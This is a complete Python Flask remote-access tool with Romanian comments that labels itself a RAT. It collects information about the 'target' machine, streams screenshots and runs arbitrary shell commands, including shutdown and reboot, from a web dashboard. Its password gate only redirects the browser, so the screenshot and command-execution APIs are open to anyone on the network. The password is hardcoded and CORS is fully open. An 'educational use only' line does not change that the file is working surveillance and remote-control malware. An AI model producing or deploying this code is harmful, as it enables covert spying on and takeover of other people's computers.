#!/usr/bin/env python3
import os
import socket
import subprocess
import time
import threading
import base64
import json
import sys
import pyautogui
from flask import Flask, request, jsonify, Response, render_template
from flask_cors import CORS
import numpy as np
import cv2

# Verifică și instalează dependențele necesare
def install_dependencies():
    try:
        import flask
        import flask_cors
        import pyautogui
        import numpy
        import cv2
    except ImportError:
        subprocess.call([sys.executable, "-m", "pip", "install", "flask", "flask-cors", "pyautogui", "numpy", "opencv-python"])
        print("Dependențele au fost instalate. Repornește scriptul.")
        sys.exit(1)

# Instalează dependențele la prima rulare
install_dependencies()

app = Flask(__name__)
CORS(app)  # Permite cereri cross-origin

# Configurația serverului
SERVER_HOST = '0.0.0.0'  # Ascultă pe toate interfețele de rețea
SERVER_PORT = 8080
PASSWORD = "parola_secretă_puternică"  # Schimbă cu o parolă puternică

# Stocăm informații despre sistemul țintă
system_info = {
    "hostname": socket.gethostname(),
    "ip": socket.gethostbyname(socket.gethostname()),
    "os": os.uname()[0],
    "username": os.getlogin()
}

# Rută pentru pagina principală
@app.route('/')
def index():
    # Returnează o pagină simplă de login
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Remote Access</title>
        <style>
            body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f0f0; }
            .login-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            input { padding: 10px; width: 300px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px; }
            button { padding: 10px 15px; background: #4285f4; color: white; border: none; border-radius: 4px; cursor: pointer; }
            button:hover { background: #3367d6; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Acces la distanță</h2>
            <input type="password" id="password" placeholder="Parolă">
            <button onclick="authenticate()">Autentificare</button>
            <p id="message"></p>
        </div>
        <script>
            function authenticate() {
                const password = document.getElementById('password').value;
                fetch('/auth', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({password: password})
                })
                .then(response => response.json())
                .then(data => {
                    if(data.success) {
                        window.location.href = '/dashboard';
                    } else {
                        document.getElementById('message').textContent = 'Parolă incorectă';
                    }
                });
            }
        </script>
    </body>
    </html>
    """
    return html

# Rută pentru autentificare
@app.route('/auth', methods=['POST'])
def auth():
    data = request.json
    if data and data.get('password') == PASSWORD:
        return jsonify({"success": True})
    return jsonify({"success": False})

# Rută pentru Dashboard
@app.route('/dashboard')
def dashboard():
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Dashboard Control</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }
            .container { display: flex; flex-direction: column; max-width: 1200px; margin: 0 auto; }
            .screen-container { width: 100%; position: relative; margin-bottom: 20px; }
            #screen { width: 100%; border: 1px solid #ddd; background: #000; }
            .controls { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; }
            .button { padding: 10px 15px; background: #4285f4; color: white; border: none; border-radius: 4px; cursor: pointer; }
            .button:hover { background: #3367d6; }
            .terminal { width: 100%; height: 300px; background: #000; color: #00ff00; padding: 10px; border-radius: 4px; overflow-y: auto; font-family: monospace; }
            .info-panel { background: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
            .red { background: #d23f31; }
            .red:hover { background: #c0392b; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Control de la distanță</h1>
            
            <div class="info-panel">
                <h2>Informații sistem</h2>
                <div id="system-info"></div>
            </div>
            
            <div class="screen-container">
                <img id="screen" alt="Ecran la distanță">
            </div>
            
            <div class="controls">
                <button class="button" onclick="refreshScreen()">Reîmprospătare ecran</button>
                <button class="button" onclick="startScreenStream()">Stream live</button>
                <button class="button" onclick="stopScreenStream()">Oprire stream</button>
                <button class="button" onclick="executeCommand('ls -la')">Listare fișiere</button>
                <button class="button" onclick="executeCommand('uptime')">Uptime</button>
                <button class="button" onclick="executeCommand('df -h')">Spațiu disc</button>
                <button class="button" onclick="executeCommand('free -h')">Memorie</button>
                <button class="button" onclick="executeCommand('ps aux | head -10')">Procese active</button>
                <button class="button red" onclick="executeCommand('systemctl poweroff')">Shutdown</button>
                <button class="button red" onclick="executeCommand('systemctl reboot')">Restart</button>
            </div>
            
            <div>
                <h3>Comandă personalizată</h3>
                <input type="text" id="custom-command" style="width: 80%; padding: 8px;">
                <button class="button" onclick="runCustomCommand()">Execută</button>
            </div>
            
            <h3>Terminal</h3>
            <div class="terminal" id="terminal-output"></div>
        </div>
        
        <script>
            let streamActive = false;
            let streamInterval = null;
            
            // Încarcă informațiile despre sistem
            fetch('/api/system-info')
                .then(response => response.json())
                .then(data => {
                    const infoDiv = document.getElementById('system-info');
                    infoDiv.innerHTML = `
                        <p><strong>Hostname:</strong> ${data.hostname}</p>
                        <p><strong>IP:</strong> ${data.ip}</p>
                        <p><strong>Sistem de operare:</strong> ${data.os}</p>
                        <p><strong>Utilizator:</strong> ${data.username}</p>
                    `;
                });
            
            // Funcția pentru reîmprospătarea ecranului
            function refreshScreen() {
                const screenImg = document.getElementById('screen');
                screenImg.src = '/api/screenshot?' + new Date().getTime();
            }
            
            // Funcția pentru pornirea stream-ului de ecran
            function startScreenStream() {
                if (streamActive) return;
                
                streamActive = true;
                streamInterval = setInterval(refreshScreen, 1000);
            }
            
            // Funcția pentru oprirea stream-ului
            function stopScreenStream() {
                streamActive = false;
                clearInterval(streamInterval);
            }
            
            // Funcția pentru executarea unei comenzi
            function executeCommand(command) {
                fetch('/api/execute', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: command})
                })
                .then(response => response.json())
                .then(data => {
                    const terminal = document.getElementById('terminal-output');
                    terminal.innerHTML += `<p>> ${command}</p><pre>${data.output}</pre>`;
                    terminal.scrollTop = terminal.scrollHeight;
                });
            }
            
            // Funcția pentru executarea unei comenzi personalizate
            function runCustomCommand() {
                const command = document.getElementById('custom-command').value;
                if (command.trim() !== '') {
                    executeCommand(command);
                    document.getElementById('custom-command').value = '';
                }
            }
            
            // Inițializare
            refreshScreen();
        </script>
    </body>
    </html>
    """
    return html

# API pentru informațiile de sistem
@app.route('/api/system-info')
def api_system_info():
    return jsonify(system_info)

# API pentru captură de ecran
@app.route('/api/screenshot')
def api_screenshot():
    try:
        # Facem o captură de ecran
        screenshot = pyautogui.screenshot()
        
        # Convertim imaginea în format jpg
        img_np = np.array(screenshot)
        img_np = cv2.cvtColor(img_np, cv2.COLOR_RGB2BGR)
        _, img_encoded = cv2.imencode('.jpg', img_np, [cv2.IMWRITE_JPEG_QUALITY, 70])
        
        # Returnăm imaginea ca răspuns
        return Response(img_encoded.tobytes(), mimetype='image/jpeg')
    except Exception as e:
        return jsonify({"error": str(e)})

# API pentru executare comenzi
@app.route('/api/execute', methods=['POST'])
def api_execute():
    data = request.json
    command = data.get('command', '')
    
    try:
        # Executăm comanda și obținem output-ul
        process = subprocess.Popen(
            command, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = process.communicate()
        
        # Combinăm output-ul standard și erorile
        output = stdout
        if stderr:
            output += "\nErori:\n" + stderr
            
        return jsonify({"output": output})
    except Exception as e:
        return jsonify({"error": str(e)})

# Verificăm dacă scriptul rulează direct
if __name__ == "__main__":
    print(f"Server RAT pornit la adresa: http://{system_info['ip']}:{SERVER_PORT}")
    print(f"Poți accesa de pe orice dispozitiv din rețeaua locală.")
    print(f"IMPORTANT: Acest tool este creat doar pentru scopuri educaționale și folosire pe propriile sisteme!")
    
    # Pentru a activa serverul să fie accesibil din rețea
    app.run(host=SERVER_HOST, port=SERVER_PORT, debug=False) 